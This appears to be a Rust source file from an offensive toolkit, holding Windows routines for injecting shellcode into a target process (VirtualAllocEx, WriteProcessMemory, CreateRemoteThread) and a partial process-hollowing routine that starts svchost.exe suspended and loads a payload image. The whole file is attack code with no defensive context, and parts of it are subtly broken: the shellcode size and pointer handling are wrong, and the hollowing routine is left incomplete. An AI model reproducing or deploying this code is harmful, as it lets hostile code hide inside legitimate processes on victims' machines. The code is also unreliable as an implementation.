use std::mem::size_of_val;
use std::ptr;

#[cfg(target_os = "windows")]
use windows::Win32::System::Diagnostics::Debug;
use windows::Win32::System::Memory;
use windows::Win32::System::Threading;

#[cfg(target_os = "windows")]
pub fn process_injection(pid: u32, shell_code: Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
    // Initializes a process
    let shell_code_size = size_of_val(&shell_code);
    let process_handle =
        unsafe { Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, pid) }?;

    // Allocates Memory Space
    let remote_buffer = unsafe {
        Memory::VirtualAllocEx(
            process_handle,
            None,
            shell_code_size,
            Memory::MEM_RESERVE | Memory::MEM_COMMIT,
            Memory::PAGE_EXECUTE_READWRITE,
        )
    };

    // Writes to buffer
    unsafe {
        Debug::WriteProcessMemory(
            process_handle,
            remote_buffer,
            *shell_code.as_ptr() as *const std::ffi::c_void,
            shell_code_size,
            None,
        )
    }?;

    // Execute Code
    let _remote_thread = unsafe {
        Threading::CreateRemoteThread(
            process_handle,
            None,
            0,
            std::mem::transmute(remote_buffer),
            None,
            0,
            None,
        )
    }?;

    Ok(())
}

#[cfg(target_os = "linux")]
pub fn process_injection(pid: &str) {}

#[cfg(target_os = "windows")]
pub fn process_hollowing(file: &str) -> Result<(), Box<dyn std::error::Error>> {
    use windows::{
        core::{PCSTR, PSTR},
        Win32::{
            Foundation::HANDLE,
            Storage::FileSystem::{
                self, GetFileSize, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, OPEN_EXISTING, ReadFile,
            },
            System::{
                Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
                Threading::{PROCESS_INFORMATION, STARTUPINFOA},
            },
        },
    };

    unsafe {
        let target_si: STARTUPINFOA = STARTUPINFOA::default();
        let mut target_pi: PROCESS_INFORMATION = PROCESS_INFORMATION::default();

        Threading::CreateProcessA(
            PCSTR("C:\\\\Windows\\\\System32\\\\svchost.exe".as_ptr()),
            PSTR(ptr::null_mut()),
            None,
            None,
            true,
            Threading::CREATE_SUSPENDED,
            None,
            PCSTR(ptr::null_mut()),
            &target_si as *const STARTUPINFOA,
            &mut target_pi as *mut PROCESS_INFORMATION,
        )?;

        let image_file = FileSystem::CreateFileA(
            PCSTR(file.as_ptr()),
            2147483648,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            HANDLE(0),
        )?;

        let file_size: usize = GetFileSize(image_file, None).try_into().unwrap();
        let image = VirtualAlloc(None, file_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        let mut number_of_bytes_read = 0;

        ReadFile(image_file, image, &mut number_of_bytes_read, None)
    };

    // Successfully completed operation
    Ok(())
}
